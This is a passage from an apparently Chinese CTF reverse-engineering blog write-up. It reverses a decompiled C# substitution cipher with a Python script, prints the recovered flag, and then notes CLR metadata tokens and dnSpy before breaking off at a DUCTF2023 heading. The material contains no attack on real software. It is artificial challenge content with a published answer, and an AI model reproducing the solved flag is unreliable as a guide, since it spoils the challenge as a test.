class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">internal</span> <span class="keyword">unsafe</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">EncryptStr</span>(<span class="params"><span class="built_in">char</span>* input</span>)</span></span><br><span class="line">    &#123; <span class="comment">// H[]作为索引  W中的下标取得是 H[xxx]*2  刚好H:0~69      W: 0~136</span></span><br><span class="line">        $ArrayType$$$BY0EF@H $ArrayType$$$BY0EF@H = <span class="number">45</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">4</span>) = <span class="number">15</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">8</span>) = <span class="number">67</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">12</span>) = <span class="number">61</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">16</span>) = <span class="number">8</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">20</span>) = <span class="number">68</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">24</span>) = <span class="number">9</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">28</span>) = <span class="number">39</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">32</span>) = <span class="number">60</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">36</span>) = <span class="number">2</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">40</span>) = <span class="number">56</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">44</span>) = <span class="number">63</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">48</span>) = <span class="number">36</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">52</span>) = <span class="number">38</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">56</span>) = <span class="number">28</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">60</span>) = <span class="number">29</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">64</span>) = <span class="number">57</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">68</span>) = <span class="number">50</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">72</span>) = <span class="number">1</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">76</span>) = <span class="number">0</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">80</span>) = <span class="number">51</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">84</span>) = <span class="number">52</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">88</span>) = <span class="number">17</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">92</span>) = <span class="number">3</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">96</span>) = <span class="number">26</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">100</span>) = <span class="number">21</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">104</span>) = <span class="number">40</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">108</span>) = <span class="number">11</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">112</span>) = <span class="number">37</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">116</span>) = <span class="number">16</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">120</span>) = <span class="number">31</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">124</span>) = <span class="number">22</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">128</span>) = <span class="number">32</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">132</span>) = <span class="number">19</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">136</span>) = <span class="number">33</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">140</span>) = <span class="number">4</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">144</span>) = <span class="number">66</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">148</span>) = <span class="number">53</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">152</span>) = <span class="number">65</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">156</span>) = <span class="number">25</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">160</span>) = <span class="number">41</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">164</span>) = <span class="number">44</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">168</span>) = <span class="number">20</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">172</span>) = <span class="number">7</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">176</span>) = <span class="number">12</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">180</span>) = <span class="number">18</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">184</span>) = <span class="number">64</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">188</span>) = <span class="number">30</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">192</span>) = <span class="number">49</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">196</span>) = <span class="number">58</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">200</span>) = <span class="number">10</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">204</span>) = <span class="number">62</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">208</span>) = <span class="number">24</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">212</span>) = <span class="number">43</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">216</span>) = <span class="number">48</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">220</span>) = <span class="number">46</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">224</span>) = <span class="number">6</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">228</span>) = <span class="number">47</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">232</span>) = <span class="number">13</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">236</span>) = <span class="number">35</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">240</span>) = <span class="number">42</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">244</span>) = <span class="number">14</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">248</span>) = <span class="number">59</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">252</span>) = <span class="number">23</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">256</span>) = <span class="number">27</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">260</span>) = <span class="number">34</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">264</span>) = <span class="number">54</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">268</span>) = <span class="number">55</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">272</span>) = <span class="number">5</span>;</span><br><span class="line">        $ArrayType$$$BY0EF@_W $ArrayType$$$BY0EF@_W = <span class="number">65</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">2</span>) = <span class="number">66</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">4</span>) = <span class="number">67</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">6</span>) = <span class="number">68</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">8</span>) = <span class="number">69</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">10</span>) = <span class="number">70</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">12</span>) = <span class="number">71</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">14</span>) = <span class="number">72</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">16</span>) = <span class="number">73</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">18</span>) = <span class="number">74</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">20</span>) = <span class="number">75</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">22</span>) = <span class="number">76</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">24</span>) = <span class="number">77</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">26</span>) = <span class="number">78</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">28</span>) = <span class="number">79</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">30</span>) = <span class="number">80</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">32</span>) = <span class="number">81</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">34</span>) = <span class="number">82</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">36</span>) = <span class="number">83</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">38</span>) = <span class="number">84</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">40</span>) = <span class="number">85</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">42</span>) = <span class="number">86</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">44</span>) = <span class="number">87</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">46</span>) = <span class="number">88</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">48</span>) = <span class="number">89</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">50</span>) = <span class="number">90</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">52</span>) = <span class="number">97</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">54</span>) = <span class="number">98</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">56</span>) = <span class="number">99</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">58</span>) = <span class="number">100</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">60</span>) = <span class="number">101</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">62</span>) = <span class="number">102</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">64</span>) = <span class="number">103</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">66</span>) = <span class="number">104</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">68</span>) = <span class="number">105</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">70</span>) = <span class="number">106</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">72</span>) = <span class="number">107</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">74</span>) = <span class="number">108</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">76</span>) = <span class="number">109</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">78</span>) = <span class="number">110</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">80</span>) = <span class="number">111</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">82</span>) = <span class="number">112</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">84</span>) = <span class="number">113</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">86</span>) = <span class="number">114</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">88</span>) = <span class="number">115</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">90</span>) = <span class="number">116</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">92</span>) = <span class="number">117</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">94</span>) = <span class="number">118</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">96</span>) = <span class="number">119</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">98</span>) = <span class="number">120</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">100</span>) = <span class="number">121</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">102</span>) = <span class="number">122</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">104</span>) = <span class="number">48</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">106</span>) = <span class="number">49</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">108</span>) = <span class="number">50</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">110</span>) = <span class="number">51</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">112</span>) = <span class="number">52</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">114</span>) = <span class="number">53</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">116</span>) = <span class="number">54</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">118</span>) = <span class="number">55</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">120</span>) = <span class="number">56</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">122</span>) = <span class="number">57</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">124</span>) = <span class="number">92</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">126</span>) = <span class="number">47</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">128</span>) = <span class="number">43</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">130</span>) = <span class="number">45</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">132</span>) = <span class="number">95</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">134</span>) = <span class="number">123</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">136</span>) = <span class="number">125</span>;</span><br><span class="line">        <span class="built_in">char</span>* ptr = input;</span><br><span class="line">        <span class="keyword">if</span> (*input != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                ptr++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (*(<span class="built_in">short</span>*)ptr != <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">int</span> num = ptr - input / <span class="number">2</span> &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">string</span> text = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">int</span> num2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt; num)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (;;)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> num3 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (;;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $ArrayType$$$BY0EF@_W* ptr2 = &amp;$ArrayType$$$BY0EF@_W;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        ptr2 += <span class="number">2</span> / <span class="keyword">sizeof</span>($ArrayType$$$BY0EF@_W);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> (*(<span class="built_in">short</span>*)ptr2 != <span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">if</span> (num3 &gt;= ptr2 - <span class="keyword">ref</span> $ArrayType$$$BY0EF@_W / <span class="keyword">sizeof</span>($ArrayType$$$BY0EF@_W) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">goto</span> IL_52F;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (*(num2 * <span class="number">2</span> + input) == *(num3 * <span class="number">2</span> + <span class="keyword">ref</span> $ArrayType$$$BY0EF@_W))</span><br><span class="line">                    <span class="comment">// 找索引    input[num2] == W[num3]</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">goto</span> IL_510;</span><br><span class="line">                    &#125;</span><br><span class="line">                    num3++;</span><br><span class="line">                &#125;</span><br><span class="line">                IL_53B:</span><br><span class="line">                num2++;</span><br><span class="line">                <span class="keyword">if</span> (num2 &gt;= num)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">                IL_510:</span><br><span class="line">                <span class="keyword">if</span> (num3 != <span class="number">-1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    text += (<span class="built_in">char</span>)(*(*(num3 * <span class="number">4</span> + <span class="keyword">ref</span> $ArrayType$$$BY0EF@H) * <span class="number">2</span> + <span class="keyword">ref</span> $ArrayType$$$BY0EF@_W));</span><br><span class="line">                    <span class="comment">// text += W[ 2*H[num3] ]</span></span><br><span class="line">                    <span class="keyword">goto</span> IL_53B;</span><br><span class="line">                &#125;</span><br><span class="line">                IL_52F:</span><br><span class="line">                text += <span class="string">&quot;=&quot;</span>;   <span class="comment">// base64???</span></span><br><span class="line">                <span class="keyword">goto</span> IL_53B;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Console.WriteLine(text);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里大致分析下就知道是两次索引变换 逆回去即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">$ArrayType$$$BY0EF@_W $ArrayType$$$BY0EF@_W = 65;</span></span><br><span class="line"><span class="string">        ...</span></span><br><span class="line"><span class="string">        ...</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@_W + 136) = 125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s = s.split(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">s = s[:-<span class="number">1</span>]</span><br><span class="line">W = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    c = c.split(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    W.append(c[<span class="number">1</span>].strip())</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">$ArrayType$$$BY0EF@H $ArrayType$$$BY0EF@H = 45;</span></span><br><span class="line"><span class="string">        ...</span></span><br><span class="line"><span class="string">        ...</span></span><br><span class="line"><span class="string">        *(ref $ArrayType$$$BY0EF@H + 272) = 5;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s = s.split(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">s = s[:-<span class="number">1</span>]</span><br><span class="line">H = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    c = c.split(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    H.append(c[<span class="number">1</span>].strip())</span><br><span class="line">W = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> W]</span><br><span class="line">H = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> H]</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;W1og39p2Kp+2_Zpx2&#123;/yF&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    x = <span class="built_in">ord</span>(enc[i])</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">69</span>):</span><br><span class="line">        <span class="keyword">if</span> W[j]==x:</span><br><span class="line">            pos = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    poss = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">69</span>):</span><br><span class="line">        <span class="keyword">if</span>(H[j]==pos):</span><br><span class="line">            poss = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(W[poss]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;Do_you_know_CLR&#125;</span></span><br></pre></td></tr></table></figure><p>看到flag中的CLR 去学习了一波<br>CLR: 公共语言运行库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">公共语言运行库 (CLR) 是 .NET Framework 的核心，为所有 .NET Framework 代码提供执行环境。 在 CLR 中运行的代码称为托管代码。 </span><br><span class="line">CLR 提供执行程序所需的各种函数和服务，包括实时 (JIT) 编译、分配和管理内存、强制类型安全、异常处理、线程管理和安全性。</span><br></pre></td></tr></table></figure><p>这… 看了看官方题解 说的是这里的exe是一个带有.net环境的exe，也就是运行在CLR环境下的代码<br>然后题解说从IDA打开可以定位到可以函数的token: 6000008h 并不是一个真正的地址，而是C#中的函数metatoken，是C#用于定位函数集中每个函数的一个独一无二的标识符<br>所以再用dnspy打开时就可以用token来快速定位了 确实打开&lt; Module &gt;下能找到一系列带有token的函数 学到了</p><h1 id="DUCTF2023"><a href="#DUCTF2023" class="headerlink" title="DUCTF2023"></a>DUCTF2023</h1><h2 id="nt-flag-checker"><a href="#nt-flag-checker" class="headerlink" title="nt_flag_checker"></a>nt_flag_checker</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 